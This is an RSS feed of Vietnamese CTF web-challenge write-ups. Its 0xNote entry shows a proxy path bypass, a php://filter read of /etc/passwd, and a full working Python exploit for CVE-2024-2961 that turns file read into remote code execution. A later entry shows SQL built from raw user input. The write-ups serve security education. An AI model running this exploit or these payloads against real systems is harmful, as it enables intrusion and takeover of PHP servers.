<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WEBs on MSEC</title><link>https://mtasecurity.github.io/MSEC/web/</link><description>Recent content in WEBs on MSEC</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>© 2026</copyright><atom:link href="https://mtasecurity.github.io/MSEC/web/index.xml" rel="self" type="application/rss+xml"/><item><title>LEAK FORCE</title><link>https://mtasecurity.github.io/MSEC/web/1761315315933-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761315315933-web/</guid><description>&lt;h1 class="relative group"&gt;LEAK FORCE
&lt;div id="leak-force" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#leak-force" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BJQDAszAgg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h4 class="relative group"&gt;TEST
&lt;div id="test" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#test" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;
&lt;p&gt;Challenge cung cấp một mã nguồn HTML &lt;a
href="http://web1.cscv.vn:9981/"
target="_blank"
&gt;http://web1.cscv.vn:9981/&lt;/a&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJ8899f0gg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Trước tiên em sẽ thử các chức năng của web&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Register các thứ các thứ rồi login với username: abc2, password: abc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sau khi login xong thì sẽ được chuyển tới trang &lt;a
href="http://web1.cscv.vn:9981/profile.html"
target="_blank"
&gt;http://web1.cscv.vn:9981/profile.html&lt;/a&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HJwSEsG0le.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761315315933-web/featured.png"/></item><item><title>Magik</title><link>https://mtasecurity.github.io/MSEC/web/1761494653599-tung/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761494653599-tung/</guid><description>&lt;h1 class="relative group"&gt;Magik
&lt;div id="magik" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#magik" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Author : Tiwza&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;Overview
&lt;div id="overview" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="{BBFD61B4-A254-4DB8-9F65-A1E5CC5EEB72}"
src="https://hackmd.io/_uploads/H1KCSzoRxg.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h3 class="relative group"&gt;Cầu trúc của bài này
&lt;div id="cầu-trúc-của-bài-này" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#c%e1%ba%a7u-tr%c3%bac-c%e1%bb%a7a-b%c3%a0i-n%c3%a0y" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code=" data-lang="code="&gt;magik/
└── app/
├── index.php
├── convert.sh
├── docker-compose.yml
├── Dockerfile
├── flags.txt
└── readflag.c
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 class="relative group"&gt;Lần lượt đọc từng file
&lt;div id="lần-lượt-đọc-từng-file" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#l%e1%ba%a7n-l%c6%b0%e1%bb%a3t-%c4%91%e1%bb%8dc-t%e1%bb%abng-file" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Dockerfile&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;- Đọc `Dockerfile` để hiểu rõ hơn
```code=
COPY readflag.c /readflag.c
RUN gcc /readflag.c -o /readflag
RUN chmod u+s /readflag
RUN rm -f /readflag.c
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Đặt &lt;code&gt;SUID&lt;/code&gt; lên &lt;code&gt;/readflag&lt;/code&gt; nên user ở &lt;code&gt; www-data&lt;/code&gt; không thể đọc&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761494653599-tung/featured.png"/></item><item><title>OxL4ugh CTF</title><link>https://mtasecurity.github.io/MSEC/web/0xl4ugh/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/0xl4ugh/</guid><description>&lt;h1 class="relative group"&gt;0xNote
&lt;div id="0xnote" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#0xnote" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/ryOk1sVIWx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;h2 class="relative group"&gt;Overview
&lt;div id="overview" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Backend : &lt;strong&gt;fpm&lt;/strong&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJSBJj4U-l.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Proxy : &lt;strong&gt;nginx&lt;/strong&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HkQCko4LZl.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Giao diện
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SkCqlsE8be.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Tuy nhiên bị chặn ở &lt;code&gt;/premium.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;Solve
&lt;div id="solve" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#solve" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Với cách viết proxy như sau ta có thể bypass bằng việc thêm &lt;code&gt;index.php&lt;/code&gt; ngay sau thư mục mà ta bị chặn (&lt;code&gt;premium.php&lt;/code&gt;)
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BkGVeoVI-x.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a
href="https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm"
target="_blank"
&gt;Cách bypass ở đây&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Sau khi vào được &lt;code&gt;/premium.php&lt;/code&gt; bằng &lt;code&gt;/premium.php/index.php&lt;/code&gt; ta thấy được ứng dụng set color không fillter input người dùng&lt;/li&gt;
&lt;li&gt;Như đoạn code sau nếu có thể kiểm soát được &lt;code&gt;color&lt;/code&gt; và &lt;code&gt;note&lt;/code&gt; thì có thể tạo ra 1 object mới :
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkKAWiNL-e.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;Exploit
&lt;div id="exploit" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#exploit" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì&lt;/li&gt;
&lt;li&gt;Set path : &lt;code&gt;php://filter/convert.base64-encode/resource=/etc/passwd&lt;/code&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Sy_7VjNUZx.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Set Classname
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/H1PwVjEIWl.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Đọc kết quả
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rkbq4sV8Wx.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Auket lấy được &lt;code&gt;etc/passwd&lt;/code&gt; tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rJzRNiVUZg.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="relative group"&gt;Nâng quyền
&lt;div id="nâng-quyền" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#n%c3%a2ng-quy%e1%bb%81n" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ngay khi thực hiện được &lt;code&gt;SPLFileObject&lt;/code&gt; như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ &lt;a
href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py"
target="_blank"
&gt;đoạn tài liệu sau&lt;/a&gt; và &lt;a
href="https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html"
target="_blank"
&gt;cái này&lt;/a&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SJfsHsVIZl.png"
&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào &lt;code&gt;http://localhost:5000/&lt;/code&gt; để check id&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-php=" data-lang="php="&gt;import requests
from pwn import *
import re
import base64
import zlib
from bs4 import BeautifulSoup
session = requests.Session()
## Constant
HEAP_SIZE = 2 * 1024 * 1024
BUG = &amp;#34;劄&amp;#34;.encode(&amp;#34;utf-8&amp;#34;)
## Post init function
def get_file(url, path):
path = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;
r = session.post(url + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})
r = session.post(url + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;:path})
r = session.post(url + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})
r = session.get(url + &amp;#39;index.php&amp;#39;)
soup = BeautifulSoup(r.text, &amp;#34;html.parser&amp;#34;)
data = soup.find(&amp;#34;div&amp;#34;, id=&amp;#34;noteContent&amp;#34;).get_text(strip=True)
return base64.b64decode(data)
def compress(data):
return zlib.compress(data, 9)[2:-4]
def compressed_bucket(data):
return chunked_chunk(data, 0x8000)
def qpe(data):
return &amp;#34;&amp;#34;.join(f&amp;#34;={x:02x}&amp;#34; for x in data).upper().encode()
def ptr_bucket(*ptrs, size=None):
if size is not None:
assert len(ptrs) * 8 == size
bucket = b&amp;#34;&amp;#34;.join(map(p64, ptrs))
bucket = qpe(bucket)
bucket = chunked_chunk(bucket)
bucket = chunked_chunk(bucket)
bucket = chunked_chunk(bucket)
bucket = compressed_bucket(bucket)
return bucket
def chunked_chunk(data, size: int = None):
if size is None:
size = len(data) + 8
keep = len(data) + len(b&amp;#34;\n\n&amp;#34;)
size = f&amp;#34;{len(data):x}&amp;#34;.rjust(size - keep, &amp;#34;0&amp;#34;)
return size.encode() + b&amp;#34;\n&amp;#34; + data + b&amp;#34;\n&amp;#34;
## Pwn core
class PWN_Core():
def __init__(self, url, command) -&amp;gt; None:
self.url = url
self.command = command
self.info = {}
self.heap = None
self.pad = 20
class Region():
def __init__(self, start, stop, permissions, path):
self.start = int(start)
self.stop = int(stop)
self.permissions = permissions
self.path = path
@property
def size(self) -&amp;gt; int:
return self.stop - self.start
def download_file(self, remote_path: str, local_path: str) -&amp;gt; None:
data = get_file(self.url, remote_path)
Path(local_path).write_bytes(data)
def get_regions(self):
maps = get_file(self.url, &amp;#34;/proc/self/maps&amp;#34;)
maps = maps.decode()
PATTERN = re.compile(
r&amp;#34;^([a-f0-9]+)-([a-f0-9]+)\b&amp;#34; r&amp;#34;.*&amp;#34; r&amp;#34;\s([-rwx]{3}[ps])\s&amp;#34; r&amp;#34;(.*)&amp;#34;
)
regions = []
for region in [line.strip() for line in maps.strip().split(&amp;#39;\n&amp;#39;)]:
if match := PATTERN.match(region):
start = int(match.group(1), 16)
stop = int(match.group(2), 16)
permissions = match.group(3)
path = match.group(4)
if &amp;#34;/&amp;#34; in path or &amp;#34;[&amp;#34; in path:
path = path.rsplit(&amp;#34; &amp;#34;, 1)[-1]
else:
path = &amp;#34;&amp;#34;
current = self.Region(start, stop, permissions, path)
regions.append(current)
else:
print(maps)
return regions
def _get_region(self, regions: list[Region], *names: str) -&amp;gt; Region:
for region in regions:
if any(name in region.path for name in names):
break
return region
def find_main_heap(self, regions):
heaps = [
region.stop - HEAP_SIZE + 0x40
for region in reversed(regions)
if region.permissions == &amp;#34;rw-p&amp;#34;
and region.size &amp;gt;= HEAP_SIZE
and region.stop &amp;amp; (HEAP_SIZE-1) == 0
and region.path in (&amp;#34;&amp;#34;, &amp;#34;[anon:zend_alloc]&amp;#34;)
]
first = heaps[0]
if len(heaps) &amp;gt; 1:
heaps = &amp;#34;, &amp;#34;.join(map(hex, heaps))
return first
def get_symbols_and_addresses(self) -&amp;gt; None:
regions = self.get_regions()
LIBC_FILE = &amp;#34;./libc&amp;#34;
self.info[&amp;#34;heap&amp;#34;] = self.find_main_heap(regions)
libc = self._get_region(regions, &amp;#34;libc-&amp;#34;, &amp;#34;libc.so&amp;#34;)
self.download_file(libc.path, LIBC_FILE)
self.info[&amp;#34;libc&amp;#34;] = ELF(LIBC_FILE, checksec=False)
self.info[&amp;#34;libc&amp;#34;].address = libc.start
def build_exploit_path(self):
self.get_symbols_and_addresses()
LIBC = self.info[&amp;#34;libc&amp;#34;]
ADDR_EMALLOC = LIBC.symbols[&amp;#34;__libc_malloc&amp;#34;]
ADDR_EFREE = LIBC.symbols[&amp;#34;__libc_system&amp;#34;]
ADDR_EREALLOC = LIBC.symbols[&amp;#34;__libc_realloc&amp;#34;]
ADDR_HEAP = self.info[&amp;#34;heap&amp;#34;]
ADDR_FREE_SLOT = ADDR_HEAP + 0x20
ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
CS = 0x100
pad_size = CS - 0x18
pad = b&amp;#34;\x00&amp;#34; * pad_size
pad = chunked_chunk(pad, len(pad) + 6)
pad = chunked_chunk(pad, len(pad) + 6)
pad = chunked_chunk(pad, len(pad) + 6)
pad = compressed_bucket(pad)
step1_size = 1
step1 = b&amp;#34;\x00&amp;#34; * step1_size
step1 = chunked_chunk(step1)
step1 = chunked_chunk(step1)
step1 = chunked_chunk(step1, CS)
step1 = compressed_bucket(step1)
step2_size = 0x48
step2 = b&amp;#34;\x00&amp;#34; * (step2_size + 8)
step2 = chunked_chunk(step2, CS)
step2 = chunked_chunk(step2)
step2 = compressed_bucket(step2)
step2_write_ptr = b&amp;#34;0\n&amp;#34;.ljust(step2_size, b&amp;#34;\x00&amp;#34;) + p64(ADDR_FAKE_BIN)
step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
step2_write_ptr = chunked_chunk(step2_write_ptr)
step2_write_ptr = compressed_bucket(step2_write_ptr)
step3_size = CS
step3 = b&amp;#34;\x00&amp;#34; * step3_size
assert len(step3) == CS
step3 = chunked_chunk(step3)
step3 = chunked_chunk(step3)
step3 = chunked_chunk(step3)
step3 = compressed_bucket(step3)
step3_overflow = b&amp;#34;\x00&amp;#34; * (step3_size - len(BUG)) + BUG
assert len(step3_overflow) == CS
step3_overflow = chunked_chunk(step3_overflow)
step3_overflow = chunked_chunk(step3_overflow)
step3_overflow = chunked_chunk(step3_overflow)
step3_overflow = compressed_bucket(step3_overflow)
step4_size = CS
step4 = b&amp;#34;=00&amp;#34; + b&amp;#34;\x00&amp;#34; * (step4_size - 1)
step4 = chunked_chunk(step4)
step4 = chunked_chunk(step4)
step4 = chunked_chunk(step4)
step4 = compressed_bucket(step4)
step4_pwn = ptr_bucket(
0x200000,
0,
# free_slot
0,
0,
ADDR_CUSTOM_HEAP, # 0x18
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
ADDR_HEAP, # 0x140
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
size=CS,
)
step4_custom_heap = ptr_bucket(
ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
)
step4_use_custom_heap_size = 0x140
COMMAND = self.command
COMMAND = f&amp;#34;kill -9 $PPID; {COMMAND}&amp;#34;
COMMAND = COMMAND.encode() + b&amp;#34;\x00&amp;#34;
COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&amp;#34;\x00&amp;#34;)
step4_use_custom_heap = COMMAND
step4_use_custom_heap = qpe(step4_use_custom_heap)
step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
pages = (
step4 * 3
+ step4_pwn
+ step4_custom_heap
+ step4_use_custom_heap
+ step3_overflow
+ pad * self.pad
+ step1 * 3
+ step2_write_ptr
+ step2 * 2
)
resource = compress(compress(pages))
resource = base64.b64encode(resource).decode()
resource = f&amp;#34;data:text/plain;base64,{resource}&amp;#34;
filters = [
# Create buckets
&amp;#34;zlib.inflate&amp;#34;,
&amp;#34;zlib.inflate&amp;#34;,
# Step 0: Setup heap
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
# Step 1: Reverse FL order
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
# Step 2: Put fake pointer and make FL order back to normal
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
# Step 3: Trigger overflow
&amp;#34;dechunk&amp;#34;,
&amp;#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&amp;#34;,
# Step 4: Allocate at arbitrary address and change zend_mm_heap
&amp;#34;convert.quoted-printable-decode&amp;#34;,
&amp;#34;convert.iconv.L1.L1&amp;#34;,
]
filters = &amp;#34;|&amp;#34;.join(filters)
path = f&amp;#34;php://filter/read={filters}/resource={resource}&amp;#34;
return path
def solve():
URL = &amp;#39;http://localhost:5000/&amp;#39;
command = &amp;#39;id &amp;gt; /tmp/check_id&amp;#39;
print(f&amp;#39;[+] Build payload với lệnh: {command}&amp;#39;)
path = PWN_Core(URL, command).build_exploit_path()
# 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
try:
print(&amp;#39;[*] Đang gửi payload kích hoạt RCE...&amp;#39;)
# Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
# Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
# Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
exploit_payload = f&amp;#34;php://filter/convert.base64-encode/resource={path}&amp;#34;
session.post(URL + &amp;#39;login.php&amp;#39;, data={&amp;#39;username&amp;#39;:&amp;#39;winky&amp;#39;})
session.post(URL + &amp;#39;index.php&amp;#39;, data={&amp;#39;note&amp;#39;: exploit_payload})
session.post(URL + &amp;#39;/premium.php/index.php&amp;#39;, data={&amp;#39;color&amp;#39;: &amp;#39;SplFileObject&amp;#39;})
session.get(URL + &amp;#39;index.php&amp;#39;, timeout=5) # Kích hoạt exploit
except Exception as e:
# Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
print(f&amp;#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&amp;#39;)
# 3. Đợi hệ thống đồng bộ file
import time
print(&amp;#39;[*] Đợi 2 giây để lệnh thực thi xong...&amp;#39;)
time.sleep(2)
# 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
print(&amp;#39;[*] Đang đọc kết quả từ /tmp/check_id...&amp;#39;)
try:
# Dùng chính tính năng SplFileObject để đọc file kết quả
result = get_file(URL, &amp;#34;/tmp/check_id&amp;#34;)
if result:
print(&amp;#39;\n[+] KẾT QUẢ COMMAND ID:&amp;#39;)
print(&amp;#39;=&amp;#39;*40)
print(result.decode(&amp;#39;utf-8&amp;#39;).strip())
print(&amp;#39;=&amp;#39;*40)
else:
print(&amp;#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&amp;#39;)
except Exception as e:
print(f&amp;#39;[-] Lỗi khi đọc file kết quả: {e}&amp;#39;)
if __name__ == &amp;#34;__main__&amp;#34;:
solve()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SyU18T4I-g.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/0xl4ugh/featured.png"/></item><item><title>PACKAGES</title><link>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1762867950463-web/</guid><description>&lt;h1 class="relative group"&gt;PACKAGES
&lt;div id="packages" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#packages" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Sy32vseeWx.png"
&gt;&lt;/figure&gt;
&lt;a
href="https://packages.challs.pwnoh.io/"
target="_blank"
&gt;https://packages.challs.pwnoh.io/&lt;/a&gt;&lt;/p&gt;
&lt;h3 class="relative group"&gt;Phân tích source
&lt;div id="phân-tích-source" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ph%c3%a2n-t%c3%adch-source" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SyyEhilxZx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main.py&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;distro &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request.&lt;span style="color:#a6e22e"&gt;args&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;distro&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;strip&lt;/span&gt;().&lt;span style="color:#a6e22e"&gt;lower&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;package&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;= &lt;/span&gt;request.args.get(&lt;span style="color:#e6db74"&gt;&amp;#34;package&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;strip&lt;/span&gt;().&lt;span style="color:#a6e22e"&gt;lower&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sql &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;SELECT distro, distro_version, package, package_version FROM packages&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; distro or package:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34; WHERE &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; distro:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sql &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; f&lt;span style="color:#e6db74"&gt;&amp;#34;LOWER(distro) = {json.dumps(distro)}&amp;#34;&lt;/span&gt;
